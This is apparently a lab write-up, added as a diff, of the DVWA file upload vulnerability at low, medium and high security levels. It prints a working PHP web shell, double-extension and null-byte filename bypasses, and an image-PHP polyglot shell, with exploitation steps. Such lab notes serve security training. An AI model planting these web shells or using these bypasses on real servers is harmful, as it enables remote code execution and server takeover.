@@ -1,0 +1,211 @@
+# File Upload Vulnerability
+
+**Security Levels:** Low | Medium | High
+
+---
+
+## LOW Level
+
+### Why it is Vulnerable
+
+* No file type validation
+* No file extension filtering
+* No MIME type verification
+* Files stored in web-accessible directory
+* User-controlled filename allowed
+
+---
+
+### Vulnerable Behavior
+
+```http
+POST /dvwa/vulnerabilities/upload/ HTTP/1.1
+Content-Type: multipart/form-data
+```
+
+---
+
+### Payloads (PoC)
+
+#### Malicious PHP Web Shell
+
+```php
+<?php system($_GET['cmd']); ?>
+```
+
+**Filename:**
+
+```
+shell.php
+```
+
+---
+
+### Exploitation Steps
+
+* Navigate to File Upload (Low)
+* Upload malicious PHP file
+* Access uploaded file via browser
+* Execute system commands
+
+---
+
+### Result
+
+* Arbitrary file upload successful
+* Remote code execution achieved
+
+---
+
+### Impact
+
+* Full server compromise
+* Command execution
+* Data theft or defacement
+
+---
+
+### Severity: **Critical**
+
+---
+
+## MEDIUM Level
+
+### Why it is Vulnerable
+
+* Client-side file extension validation
+* Blacklist-based filtering
+* MIME type can be bypassed
+* No server-side content inspection
+
+---
+
+### Vulnerable Logic
+
+```php
+if ($file_ext != "php") {
+    move_uploaded_file();
+}
+```
+
+---
+
+### Payloads (PoC)
+
+#### Double Extension Bypass
+
+```
+shell.php.jpg
+shell.pHp
+shell.php%00.jpg
+```
+
+---
+
+### Exploitation Steps
+
+* Intercept upload request in Burp Suite
+* Modify filename extension
+* Bypass blacklist validation
+* Upload malicious file
+
+---
+
+### Result
+
+* File upload restrictions bypassed
+* Malicious file stored on server
+
+---
+
+### Impact
+
+* Code execution possible
+* Web shell access
+* Application takeover
+
+---
+
+### Severity: **High**
+
+---
+
+## HIGH Level
+
+### Why it is Vulnerable
+
+* Extension whitelisting implemented
+* MIME type validation present
+* Content inspection incomplete
+* Upload directory still executable
+
+---
+
+### Vulnerable Logic
+
+```php
+$allowed = array("jpg", "png", "jpeg");
+```
+
+---
+
+### Attack Concept
+
+> Upload a **polyglot file** that is both a valid image and executable script.
+
+---
+
+### Payloads (PoC)
+
+#### PHP Image Polyglot
+
+```php
+GIF89a
+<?php system($_GET['cmd']); ?>
+```
+
+**Filename:**
+
+```
+image.php.jpg
+```
+
+---
+
+### Exploitation Steps
+
+* Create image + PHP polyglot
+* Upload allowed file type
+* Access uploaded file path
+* Execute embedded PHP code
+
+---
+
+### Result
+
+* Server-side code execution
+* Upload protection bypassed
+
+---
+
+### Impact
+
+* Persistent backdoor
+* Complete system compromise
+* Lateral movement possible
+
+---
+
+### Severity: **High**
+
+---
+
+## Overall Impact Summary
+
+* File upload is a critical vulnerability
+* Leads directly to RCE
+* Poor validation enables bypasses
+* Secure upload handling is mandatory
+* Misconfigured upload directories amplify risk
+
+---
